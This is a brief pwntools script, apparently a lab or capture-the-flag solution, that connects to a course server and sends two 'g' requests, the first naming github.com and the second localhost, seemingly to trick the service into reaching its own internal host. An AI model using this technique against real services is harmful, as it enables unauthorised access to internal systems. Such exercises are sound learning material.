#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

r = remote('up.zoolab.org', 10932);

r.sendline(b'g')
r.sendline(b'github.com/10000')
r.sendline(b'g')
r.sendline(b'localhost/10000')

r.interactive();
r.close();